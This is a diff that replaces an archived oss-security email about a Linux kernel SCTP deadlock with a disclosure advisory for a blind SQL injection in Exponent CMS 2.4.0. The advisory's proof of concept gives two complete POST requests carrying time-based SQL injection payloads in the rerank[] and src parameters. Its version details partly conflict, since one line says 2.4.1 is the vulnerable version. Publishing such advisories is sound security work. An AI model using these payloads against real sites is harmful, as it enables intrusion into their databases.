@@ -1,44 +1,102 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/01/11/4
-Message-ID: <993560327.6397475.1452519141475.JavaMail.zimbra@redhat.com>
-Date: Mon, 11 Jan 2016 08:32:21 -0500 (EST)
-From: Wade Mealing <wmealing@...hat.com>
-To: OSS Security List <oss-security@...ts.openwall.com>
-Cc: cve-assign@...re.org
-Subject: CVE Request: Linux kernel -  SCTP denial of service during heartbeat timeout functions.
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/11/10/1
+Message-ID: <512920BCA865344FBF69666E6859CBA852933DFD@EXMBX-SZMAIL015.tencent.com>
+Date: Thu, 10 Nov 2016 02:07:02 +0000
+From: nickyccwu(伍惠宇) <nickyccwu@...cent.com>
+To: oss-security <oss-security@...ts.openwall.com>
+Subject: CVE Request: Blind SQL Injection Vulnerability in Exponent CMS 2.4.0
 Content-Type: text/plain; charset=utf-8
 
-Gday all,
 
->From the patch[1] commit comments:
+Document Title:
+===============
+Blind SQL Injection Vulnerability in Exponent CMS 2.4.0
 
---
-A case can occur when sctp_accept() is called by the user during
-a heartbeat timeout event after the 4-way handshake.  Since
-sctp_assoc_migrate() changes both assoc->base.sk and assoc->ep, the
-bh_sock_lock in sctp_generate_heartbeat_event() will be taken with
-the listening socket but released with the new association socket.
-The result is a deadlock on any future attempts to take the listening
-socket lock.
+References (Source):
+====================
+https://exponentcms.lighthouseapp.com/projects/61783/tickets/1394-blind-sql-injection-vulnerability-in-exponent-cms-240-4
+https://github.com/exponentcms/exponent-cms/commit/fffb2038de4c603931b785a4c3ec69cfd06181ba
 
-Note that this race can occur with other SCTP timeouts that take
-the bh_lock_sock() in the event sctp_accept() is called.
----
+Release Date:
+=============
+2016-11-06
 
-TLDR: ensure that the lock on the socket taken is also the
-same one that is released by saving a copy of the socket 
-before entering the heartbeat event critical section.
 
-I'd like a CVE for this issue. 
+Product & Service Introduction:
+===============================
+Exponent CMS is an exciting web-based content management system. It makes creating and maintaining websites easy for non-technical users, while providing site managers the power and flexibility to add new features, completely customize the layout, and delegate responsibilities to other users.
 
-Thanks !
+Abstract Advisory Information:
+==============================
+Nicky (Tencent Security Platform Department) discovered a remote sql-injection vulnerability in the Exponent CMS 2.4.0.
 
-Wade Mealing
-Red Hat Product Security
+Vulnerability Disclosure Timeline:
+==================================
+2016-11-06: Report to the vendor
+2016-11-07: Vendor confirm the vul and fix it in exponent cms 2.4.1
 
-Resources:
-https://bugzilla.redhat.com/show_bug.cgi?id=1297389
-https://patchwork.ozlabs.org/patch/522412/
+Discovery Status:
+=================
+Published
 
-Patch commit notes (net-next.git):
-[1] https://kernel.googlesource.com/pub/scm/linux/kernel/git/horms/ipvs/+/635682a14427d241bab7bbdeebb48a7d7b91638e
+Exploitation Technique:
+=======================
+Remote
+
+Severity Level:
+===============
+High
+
+Technical Details & Description:
+================================
+A remote sql injection web vulnerability has been discovered in the exponent cms 2.4.1.
+The web vulnerability allows remote attackers to execute own malicious sql commands to compromise the application or dbms.
+
+Request Method(s):
+[+] POST
+
+Vulnerable Parameter(s):
+[+] lastpage / src
+
+Proof of Concept (PoC):
+=======================
+The remote sql-injection web vulnerability can be exploited by remote attackers.
+For security demonstration or to reproduce the sql-injection web vulnerability follow the provided information and steps below to continue.
+
+POST /exponent/ HTTP/1.1
+Content-Length: 268
+Content-Type: application/x-www-form-urlencoded
+X-Requested-With: XMLHttpRequest
+Referer: http://192.168.118.1:80/exponent/
+Cookie: PHPSESSID=4b42cc8b7f69ebe1afdcbf4abbfee00b; adminer_key=cdeaea5d52a8f402a28bd04980a7851b
+Host: 192.168.118.1
+Connection: Keep-alive
+Accept-Encoding: gzip,deflate
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
+Accept: */*
+
+action=manage_ranks&controller=container&lastpage=http://192.168.118.1/exponent/untitled&model=container&rerank%5b%5d=if(now()%3dsysdate()%2csleep(0)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(0)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(0)%2c0))OR%22*/&src=%40section1
+
+
+POST /exponent/ HTTP/1.1
+Content-Length: 251
+Content-Type: application/x-www-form-urlencoded
+X-Requested-With: XMLHttpRequest
+Referer: http://192.168.118.1:80/exponent/
+Cookie: PHPSESSID=f7859e8215b717f81b7dbd2e2c1a2caa; adminer_key=cdeaea5d52a8f402a28bd04980a7851b
+Host: 192.168.118.1
+Connection: Keep-alive
+Accept-Encoding: gzip,deflate
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
+Accept: */*
+
+action=manage_ranks&controller=container&lastpage=http://192.168.118.1/exponent/&model=container&rerank%5b%5d=16&src=if(now()%3dsysdate()%2csleep(0)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(0)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(0)%2c0))OR%22*/
+
+
+Solution - Fix & Patch:
+=======================
+Exponent CMS 2.4.1 has fixed it.(https://github.com/exponentcms/exponent-cms/commit/fffb2038de4c603931b785a4c3ec69cfd06181ba)
+
+Credits & Authors:
+==================
+Nicky of Tencent Security Platform Department
